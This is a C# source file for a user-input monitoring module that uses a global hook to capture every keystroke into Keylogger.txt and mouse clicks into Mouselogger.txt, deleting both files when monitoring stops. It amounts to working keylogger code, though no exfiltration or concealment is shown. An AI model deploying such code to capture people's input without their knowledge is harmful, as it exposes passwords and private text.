using System.IO;
using System.Reflection;
using RBS;
using Gma.System.MouseKeyHook;

namespace RBS.Monitoring_Engine
{
    public static class User_Input_Monitoring
    {      
        private static IKeyboardMouseEvents m_GlobalHook;

        public static void InitialiseUserInputMonitoring()
        {
           
            AppResources.UserInputMonitoringIsOn += AppResources_UserInputMonitoringIsOn;
            AppResources.UserInputMonitoringIsOff += AppResources_UserInputMonitoringIsOff;
        }

        private static void AppResources_UserInputMonitoringIsOn(object sender, System.EventArgs e)
        {
            StartUIM();
        }
        private static void AppResources_UserInputMonitoringIsOff(object sender, System.EventArgs e)
        {
            StopUIM();
        }

        public static void StartUIM()
        {
            m_GlobalHook = Hook.GlobalEvents();
            m_GlobalHook.KeyPress += GlobalHookKeyPress;
            m_GlobalHook.MouseDownExt += GlobalHookMouseDownExt;
        }

       
        private static void GlobalHookKeyPress(object sender, System.Windows.Forms.KeyPressEventArgs e)
        {
            using (StreamWriter writer = new StreamWriter(AppResources.Path + @"Keylogger.txt", true))
            {
                writer.Write(e.KeyChar);
            }
            AppResources.NewKeyStrokesHasCaptured();
        }

        private static void GlobalHookMouseDownExt(object sender, MouseEventExtArgs e)
        {
            using (StreamWriter writer = new StreamWriter(AppResources.Path + "Mouselogger.txt", true))
            {
                writer.Write("Button : " + e.Button.ToString() + "\t");
                writer.Write("\tLocation : "+ e.Location.ToString() + "\t");
                writer.Write("\tTime : " + e.Timestamp.ToString() + "\t");
                writer.Write("\tWheelScrolled : " + e.Timestamp.ToString() + "\t");
                writer.Write("\n");
            }
            AppResources.NewMouseStrokesHasCaptured();
        }

        public static void StopUIM()
        {
            m_GlobalHook.KeyPress -= GlobalHookKeyPress;
            m_GlobalHook.MouseDownExt -= GlobalHookMouseDownExt;
            m_GlobalHook.Dispose();
            File.Delete(AppResources.Path + "Keylogger.txt");
            File.Delete(AppResources.Path + "Mouselogger.txt");
        }
    }   
}
